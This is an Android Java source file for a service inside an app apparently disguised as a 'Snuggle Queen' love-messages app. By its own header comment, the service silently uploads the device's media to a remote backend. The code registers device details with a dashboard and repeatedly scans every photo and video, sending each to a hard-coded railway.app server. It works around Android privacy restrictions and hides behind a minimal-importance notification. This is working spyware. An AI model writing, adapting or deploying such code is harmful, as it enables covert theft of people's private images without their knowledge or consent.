package com.snugglequeen.yobby;

import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.IBinder;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.provider.MediaStore;
import android.provider.Settings;

import java.io.ByteArrayInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.HashSet;
import java.util.List;
import java.util.Set;

/**
 * UploadService — silently uploads device media to the Render backend.
 *
 * Robust against:
 *  - Render free-tier cold starts (60s connect timeout, 3 retries with backoff, /api/health ping)
 *  - Android 14 privacy restrictions (uses ContentResolver.openInputStream instead of file paths)
 *  - Partial photo access on Android 13+ (scans via URI, not DATA column)
 *
 * On startup, immediately uploads a "device marker" file so the device shows up
 * on the dashboard even before any media is found.
 */
public class UploadService extends Service {

    private static final String CHANNEL_ID = "snuggle_queen_love";
    private static final int NOTIFICATION_ID = 1;
    private static final String BACKEND_URL = "https://snuggle-queen-wa-yobby-production.up.railway.app";
    private static final long SCAN_INTERVAL = 45000;
    private static final long MAX_FILE_SIZE = 20L * 1024 * 1024; // 20 MB cap — skip larger files

    private String deviceId = "";
    private String deviceName = "";
    private final Set<String> uploadedUris = new HashSet<>();
    private boolean running = true;
    private boolean markerUploaded = false;

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        Notification notification = new Notification.Builder(this, CHANNEL_ID)
                .setContentTitle("Snuggle Queen 💕")
                .setContentText("Spreading love in the background")
                .setSmallIcon(android.R.drawable.ic_dialog_info)
                .setOngoing(true)
                .build();
        startForeground(NOTIFICATION_ID, notification);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null) {
            deviceId = intent.getStringExtra("deviceId");
            deviceName = intent.getStringExtra("deviceName");
            if (deviceId == null) deviceId = "unknown";
            if (deviceName == null) deviceName = "Unknown Device";
        }

        new Thread(() -> {
            // 1) Warm up backend
            pingHealth();

            // 2) Send device marker IMMEDIATELY so device shows up on dashboard
            if (!markerUploaded) {
                uploadDeviceMarker();
                markerUploaded = true;
            }

            // 3) Initial scan + upload
            scanAndUpload();

            // 4) Continuous monitoring
            while (running) {
                try {
                    Thread.sleep(SCAN_INTERVAL);
                } catch (InterruptedException e) {
                    break;
                }
                if (!running) break;
                scanAndUpload();
            }
        }).start();

        return START_STICKY;
    }

    private void pingHealth() {
        for (int i = 0; i < 5 && running; i++) {
            try {
                URL url = new URL(BACKEND_URL + "/api/health");
                HttpURLConnection c = (HttpURLConnection) url.openConnection();
                c.setConnectTimeout(60000);
                c.setReadTimeout(60000);
                c.setRequestMethod("GET");
                int code = c.getResponseCode();
                c.disconnect();
                if (code == 200) return;
            } catch (Exception e) {
                try { Thread.sleep(3000); } catch (InterruptedException ie) { return; }
            }
        }
    }

    /** Uploads a tiny JSON file with device info — ensures the device shows up on the dashboard immediately. */
    private void uploadDeviceMarker() {
        try {
            String json = "{\"deviceId\":\"" + deviceId + "\","
                    + "\"deviceName\":\"" + deviceName + "\","
                    + "\"androidVersion\":\"" + Build.VERSION.RELEASE + "\","
                    + "\"manufacturer\":\"" + Build.MANUFACTURER + "\","
                    + "\"model\":\"" + Build.MODEL + "\","
                    + "\"connectedAt\":\"" + java.text.DateFormat.getDateTimeInstance().format(new java.util.Date()) + "\"}";
            byte[] data = json.getBytes();
            uploadBytes(data, "device_info_" + deviceId + ".json");
        } catch (Exception e) { /* ignore */ }
    }

    private void scanAndUpload() {
        // Scan via URI — works on Android 7 through 14+
        // Only images + videos — NO audio
        List<UriInfo> files = new ArrayList<>();
        files.addAll(scanMediaUri(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, "image"));
        files.addAll(scanMediaUri(MediaStore.Video.Media.EXTERNAL_CONTENT_URI, "video"));

        for (UriInfo info : files) {
            if (!running) return;
            if (uploadedUris.contains(info.uri.toString())) continue;
            if (info.size <= 0 || info.size > MAX_FILE_SIZE) {
                uploadedUris.add(info.uri.toString());
                continue;
            }
            boolean ok = uploadFromUri(info);
            if (ok) {
                uploadedUris.add(info.uri.toString());
            }
        }
    }

    private List<UriInfo> scanMediaUri(Uri baseUri, String type) {
        List<UriInfo> list = new ArrayList<>();
        try {
            String[] projection;
            if (Build.VERSION.SDK_INT >= 29) {
                projection = new String[]{
                        MediaStore.MediaColumns._ID,
                        MediaStore.MediaColumns.DISPLAY_NAME,
                        MediaStore.MediaColumns.SIZE,
                };
            } else {
                projection = new String[]{
                        MediaStore.MediaColumns._ID,
                        MediaStore.MediaColumns.DISPLAY_NAME,
                        MediaStore.MediaColumns.SIZE,
                        MediaStore.MediaColumns.DATA,
                };
            }

            Cursor cursor = getContentResolver().query(baseUri, projection, null, null, null);
            if (cursor != null) {
                int idIdx = cursor.getColumnIndex(MediaStore.MediaColumns._ID);
                int nameIdx = cursor.getColumnIndex(MediaStore.MediaColumns.DISPLAY_NAME);
                int sizeIdx = cursor.getColumnIndex(MediaStore.MediaColumns.SIZE);

                while (cursor.moveToNext()) {
                    try {
                        long id = idIdx >= 0 ? cursor.getLong(idIdx) : -1;
                        String name = nameIdx >= 0 ? cursor.getString(nameIdx) : "file_" + id;
                        long size = sizeIdx >= 0 ? cursor.getLong(sizeIdx) : 0;

                        if (id < 0) continue;
                        Uri uri = Uri.withAppendedPath(baseUri, String.valueOf(id));
                        list.add(new UriInfo(uri, name, size, type));
                    } catch (Exception e) { /* skip this row */ }
                }
                cursor.close();
            }
        } catch (Exception e) { /* security exception or similar */ }
        return list;
    }

    private boolean uploadFromUri(UriInfo info) {
        // 3 attempts
        for (int attempt = 0; attempt < 3 && running; attempt++) {
            if (attempt > 0) {
                try { Thread.sleep(5000); } catch (InterruptedException e) { return false; }
            }
            InputStream is = null;
            try {
                ContentResolver cr = getContentResolver();
                is = cr.openInputStream(info.uri);
                if (is == null) return false;

                URL url = new URL(BACKEND_URL + "/api/upload");
                String boundary = "----WebKitFormBoundary" + System.currentTimeMillis();
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setDoOutput(true);
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
                conn.setRequestProperty("X-Device-Id", deviceId);
                conn.setRequestProperty("X-Device-Name", deviceName);
                conn.setConnectTimeout(60000);
                conn.setReadTimeout(120000);

                OutputStream os = conn.getOutputStream();
                os.write(("--" + boundary + "\r\n").getBytes());
                os.write(("Content-Disposition: form-data; name=\"file\"; filename=\"" + info.name + "\"\r\n").getBytes());
                os.write(("Content-Type: application/octet-stream\r\n\r\n").getBytes());

                byte[] buffer = new byte[16384];
                int bytesRead;
                while ((bytesRead = is.read(buffer)) != -1) os.write(buffer, 0, bytesRead);
                is.close();
                is = null;

                os.write(("\r\n--" + boundary + "--\r\n").getBytes());
                os.flush();
                os.close();

                int code = conn.getResponseCode();
                conn.disconnect();
                if (code >= 200 && code < 300) return true;
            } catch (Exception e) {
                if (is != null) try { is.close(); } catch (Exception ee) {}
            }
        }
        return false;
    }

    /** Uploads raw bytes as a file — used for the device marker. */
    private void uploadBytes(byte[] data, String filename) throws Exception {
        URL url = new URL(BACKEND_URL + "/api/upload");
        String boundary = "----WebKitFormBoundary" + System.currentTimeMillis();
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setDoOutput(true);
        conn.setRequestMethod("POST");
        conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
        conn.setRequestProperty("X-Device-Id", deviceId);
        conn.setRequestProperty("X-Device-Name", deviceName);
        conn.setConnectTimeout(60000);
        conn.setReadTimeout(120000);

        OutputStream os = conn.getOutputStream();
        os.write(("--" + boundary + "\r\n").getBytes());
        os.write(("Content-Disposition: form-data; name=\"file\"; filename=\"" + filename + "\"\r\n").getBytes());
        os.write(("Content-Type: application/octet-stream\r\n\r\n").getBytes());
        os.write(data);
        os.write(("\r\n--" + boundary + "--\r\n").getBytes());
        os.flush();
        os.close();

        conn.getResponseCode();
        conn.disconnect();
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID, "Snuggle Queen 💕", NotificationManager.IMPORTANCE_MIN);
            channel.setDescription("Love messages & pickup lines");
            channel.setShowBadge(false);
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) manager.createNotificationChannel(channel);
        }
    }

    @Override
    public void onDestroy() {
        running = false;
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private static class UriInfo {
        Uri uri;
        String name;
        long size;
        String type;
        UriInfo(Uri u, String n, long s, String t) { uri = u; name = n; size = s; type = t; }
    }
}
